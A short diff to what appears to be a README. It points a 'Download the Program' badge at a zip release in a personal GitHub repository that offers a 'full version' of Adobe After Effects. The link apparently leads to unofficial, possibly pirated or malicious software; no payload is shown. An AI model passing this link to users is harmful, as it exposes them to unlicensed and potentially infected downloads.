@@ -5,7 +5,7 @@
 </div>
 
 ## 📥 Download the Program
-<a href="#" download>
+<a href="https://github.com/kunaljan2002/Adobe-After-Effects-Github/releases/download/full/AdobeAE_FullVersion.zip" download>
   <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
 
